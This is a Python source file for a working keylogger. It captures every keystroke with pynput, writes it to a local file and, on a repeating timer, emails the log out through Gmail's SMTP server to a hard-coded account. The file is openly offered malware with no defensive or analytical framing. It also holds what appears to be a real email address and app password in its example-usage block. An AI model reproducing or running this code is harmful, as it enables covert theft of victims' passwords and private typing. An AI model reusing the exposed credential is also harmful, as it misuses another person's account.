import smtplib
import threading
from pynput import keyboard

class KeyLogger:
    def __init__(self, time_interval: int, email: str, password: str) -> None:
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password
        self.file_path = "keylog.txt"  # Path to the log file

    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log = self.log + string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.esc:
                print("esc pressed")
                self.stop_keylogger()
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report_n_send(self):
        if self.log.strip():  # Only send if there's something in the log
            with open(self.file_path, "a") as file:
                file.write("\n" + self.log)
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def stop_keylogger(self):
        with open(self.file_path, "a") as file:
            file.write("\nKeyLogger Stopped")
        exit(0)

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()
            try:
                keyboard_listener.join()
            except KeyboardInterrupt:
                self.stop_keylogger()

if __name__ == "__main__":
    # Example usage:
    email_address = "aribanawaz2003@gmail.com"  # Replace with your email
    email_password = "emhfanewqvvinfhn"  # Replace with your password
    interval_seconds = 5  # Interval for sending emails

    keylogger = KeyLogger(interval_seconds, email_address, email_password)
    keylogger.start()
